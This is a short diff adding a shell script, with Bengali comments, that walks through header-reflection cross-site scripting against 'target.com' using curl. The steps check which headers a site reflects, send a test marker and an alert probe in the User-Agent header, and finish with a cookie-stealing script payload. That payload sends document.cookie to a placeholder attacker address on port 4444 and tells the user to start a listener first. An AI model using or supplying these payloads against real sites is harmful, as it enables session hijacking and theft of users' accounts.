@@ -1,0 +1,12 @@
+# 1. হেডার রিফ্লেক্ট হচ্ছে কিনা চেক করুন
+curl -v http://target.com/api/endpoint 2>&1 | grep -i "user-agent\|referer\|x-"
+
+# 2. টেস্ট পেলোড পাঠান
+curl -A "TEST123" http://target.com
+# রেসপন্সে "TEST123" খুঁজুন
+
+# 3. XSS টেস্ট
+curl -A "<img src=x onerror=alert(1)>" http://target.com
+
+# 4. কুকি চুরি (লিসেনার চালান আগে)
+curl -A "<script>fetch('http://YOUR-IP:4444?c='+document.cookie)</script>" http://target.com
